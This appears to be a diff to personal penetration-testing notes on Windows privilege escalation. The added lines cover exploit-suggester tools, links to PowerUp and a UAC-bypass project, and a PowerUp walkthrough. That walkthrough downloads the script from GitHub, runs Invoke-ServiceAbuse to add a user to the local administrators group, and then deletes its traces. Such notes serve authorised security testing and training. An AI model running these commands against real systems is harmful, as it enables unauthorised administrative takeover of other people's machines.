@@ -71,6 +71,11 @@ systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
 wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
 wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
 ```
+*** or with metasploit (auto)***
+```bash
+
+use post/multi/recon/local_exploit_suggester
+```
 
 ```bash
 [System.Environment]::OSVersion.Version #Current OS version
@@ -78,7 +83,7 @@ Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hot
 Get-Hotfix -description "Security update" #List only "Security Update" patches
 ```
 
-### Version Exploits
+#### Version Exploits
 
 This [site](https://msrc.microsoft.com/update-guide/vulnerability) is handy for searching out detailed information about Microsoft security vulnerabilities. This database has more than 4,700 security vulnerabilities, showing the **massive attack surface** that a Windows environment presents.
 
@@ -88,6 +93,8 @@ This [site](https://msrc.microsoft.com/update-guide/vulnerability) is handy for 
 * _post/multi/recon/local\_exploit\_suggester_
 * [_watson_](https://github.com/rasta-mouse/Watson)
 * [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_
+* https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
+* https://github.com/hfiref0x/UACME  (bypass UAC)
 
 **Locally with system information**
 
@@ -99,6 +106,7 @@ This [site](https://msrc.microsoft.com/update-guide/vulnerability) is handy for 
 * [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
 * [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
 * [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)
+
 
 ### Environment
 
@@ -607,6 +615,45 @@ sc.exe config usosvc start= auto
 
 ^f3a293
 
+#### Auto using powerup 
+
+^1a5015
+
+**PowerUp - Service Abuse for Privilege Escalation**
+
+1. **Download PowerUp**  
+   ```powershell
+   (new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1', 'C:\Windows\Temp\PowerUp.ps1')
+   ```
+
+2. **Load PowerUp**  
+   ```powershell
+   Import-Module C:\Windows\Temp\PowerUp.ps1
+   ```
+
+3. **Identify Vulnerable Services**  
+   ```powershell
+   Invoke-AllChecks
+   ```
+
+4. **Exploit Service**  
+   Example: Add a user to administrators group using a vulnerable service.
+   ```powershell
+   Invoke-ServiceAbuse -Name AppReadiness -Command "net localgroup administrators bob /add"
+   ```
+
+5. **Verify**  
+   ```powershell
+   net localgroup administrators
+   ```
+
+6. **Clean Up**  
+   ```powershell
+   Remove-Item C:\Windows\Temp\PowerUp.ps1
+   ```
+
+
+#### Manuel 
 Each service has an ACL which defines certain service-specific
 permissions.
 Some permissions are innocuous (e.g. SERVICE_QUERY_CONFIG,
